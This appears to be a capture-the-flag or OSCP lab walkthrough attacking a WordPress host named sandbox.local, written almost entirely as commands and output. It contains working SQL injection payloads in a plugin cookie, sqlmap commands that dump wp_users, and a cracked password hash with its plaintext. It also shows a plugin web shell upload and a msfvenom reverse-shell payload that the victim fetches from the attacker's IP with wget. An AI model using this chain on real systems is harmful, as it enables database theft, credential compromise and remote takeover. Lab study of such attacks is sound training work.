#### Breakdown

```
sudo bash -c " echo ‘10.11.1.250 sandbox.local’ >> /etc/hosts"

```

```
sudo nmap -sC -sS -p0-65535 sandbox.local

dirb http://sandbox.local -o dirb.out

wpscan --url sandbox.local --enumerate ap,at,cb,dbe -o wp-out.txt

wp_sap cookie value

["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]

 ["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]

 ["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name='wp_users'#"]

["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"]

["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"]

```

Using sqlmap

```

sqlmap --url='http://sandbox.local/' --cookie="wp_sap=[\"1650149780')) OR 1=2 *#\"]" --dbms=mysql --union-cols=10-11 --technique U 

sqlmap -r req.txt  --dbms=mysql --union-cols=10-11 --technique U   --level=3 --current-db --tables 

sqlmap -r req.txt  --dbms=mysql --union-cols=10-11 --technique U   --level=3 -D wordpress -T wp_users --dump

```

content of req.txt

```
┌──(kali㉿kali)-[~/oscp/machines/sandbox]
└─$ cat req.txt 
GET / HTTP/1.1
Host: sandbox.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sandbox.local/
DNT: 1
Connection: close
Cookie: wp_sap=["1650149780')) OR 1=2 *#"];
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

hash from sqlmap: $P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i\\\\\\/

6 \ is for one /.
Real hash: $P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/

on web ui there were three \ in the hash.

user: wp_ajla_admin
 
cracking password:

john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt

```
┌──(kali㉿kali)-[~/…/share/sqlmap/output/sandbox.local]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt        
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!love29jan2006!  (?)     
1g 0:00:04:45 DONE (2022-06-22 21:18) 0.003497g/s 50146p/s 50146c/s 50146C/s !luv2:P..!kasumi12
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

```

cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .

zip plugin-shell.zip plugin-shell.php

http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.175 LPORT=443 -f elf > shell.elf

python -m http.server 80

http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://192.168.119.175/shell.elf

http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20+x%20shell.elf

